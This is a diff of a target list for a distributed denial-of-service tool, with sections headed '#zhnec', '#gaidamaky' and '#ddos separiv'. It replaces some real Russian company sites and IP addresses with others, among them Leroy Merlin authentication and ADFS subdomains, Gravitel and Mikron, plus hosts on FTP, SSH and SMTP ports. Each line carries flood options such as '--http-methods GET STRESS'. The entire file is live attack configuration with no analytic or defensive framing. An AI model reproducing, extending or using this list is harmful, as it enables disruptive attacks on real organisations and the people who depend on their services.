@@ -1,15 +1,13 @@
 #zhnec
 
-https://www.cdek.ru/ru tcp://78.46.28.63:80 tcp://195.189.222.41:443 --http-methods GET STRESS
-https://cdek.by/ru/ tcp://78.46.28.63:443 tcp://195.189.222.60:993 --http-methods GET STRESS
+https://leroymerlin.ru https://auth.leroymerlin.ru https://import.leroymerlin.ru https://adfs.leroymerlin.ru https://wfm.leroymerlin.ru --http-methods GET STRESS
 
 
 #gaidamaky
-https://www.zia.aero/ --http-methods STRESS
-https://93.90.220.74 https://92.246.149.20 --http-methods GET
-
-
-
+tcp://89.208.82.209:21 tcp://89.208.82.209:22 tcp://89.208.82.209:25 http://89.208.82.209 https://89.208.82.209 --http-methods GET 
+tcp://89.208.82.196:21 tcp://89.208.82.196:22 tcp://89.208.82.196:25 http://89.208.82.206 https://89.208.82.206 --http-methods GET
+http://89.208.82.196 tcp://89.208.82.195:22 tcp://89.208.82.195:25 tcp://89.208.82.206:21 tcp://89.208.82.206:22 --http-methods GET
+http://www.gravitel.ru https://www.gravitel.ru http://gravitel.omnidesk.ru http://aloha.ru --http-methods GET STRESS
 
 #ddos separiv
 https://www.aktorstc.ru http://ooo-extruzia.ru/order https://mikron.ru --http-methods GET STRESS
